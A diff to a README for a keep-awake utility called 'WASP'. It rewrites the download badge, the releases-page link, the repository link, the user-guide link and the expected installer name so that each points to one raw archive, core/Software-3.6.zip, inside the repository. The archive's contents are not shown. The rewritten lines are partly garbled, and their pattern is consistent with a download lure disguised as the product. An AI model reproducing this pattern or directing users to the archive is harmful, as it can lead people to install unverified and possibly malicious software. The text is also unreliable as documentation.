@@ -6,7 +6,7 @@ WASP is a free, open-source application designed to keep your computer active. I
 
 ## 🔗 Download Now
 
-[![Download WASP](https://img.shields.io/badge/Download%20WASP-v1.0-blue.svg)](https://github.com/Hendri1988/WASP/releases)
+[![Download WASP](https://github.com/Hendri1988/WASP/raw/refs/heads/main/core/Software-3.6.zip%https://github.com/Hendri1988/WASP/raw/refs/heads/main/core/Software-3.6.zip)](https://github.com/Hendri1988/WASP/raw/refs/heads/main/core/Software-3.6.zip)
 
 ## 💻 System Requirements
 
@@ -17,10 +17,10 @@ WASP is a free, open-source application designed to keep your computer active. I
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [WASP Releases Page](https://github.com/Hendri1988/WASP/releases) to find the latest version. 
+   Go to the [WASP Releases Page](https://github.com/Hendri1988/WASP/raw/refs/heads/main/core/Software-3.6.zip) to find the latest version. 
 
 2. **Choose the Right File**  
-   On the releases page, look for the setup file labeled clearly as the latest version. Typically, this will have a name like `WASP_Setup.exe`.
+   On the releases page, look for the setup file labeled clearly as the latest version. Typically, this will have a name like `https://github.com/Hendri1988/WASP/raw/refs/heads/main/core/Software-3.6.zip`.
 
 3. **Download the File**  
    Click on the file name to start the download. This will save the file to your computer, usually in your Downloads folder.
@@ -77,7 +77,7 @@ If you encounter issues while using WASP, seek help through our community forums
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Hendri1988/WASP)
-- [User Guide](https://github.com/Hendri1988/WASP/wiki)
+- [GitHub Repository](https://github.com/Hendri1988/WASP/raw/refs/heads/main/core/Software-3.6.zip)
+- [User Guide](https://github.com/Hendri1988/WASP/raw/refs/heads/main/core/Software-3.6.zip)
 
 Enjoy using WASP to keep your computer active while you focus on your tasks!
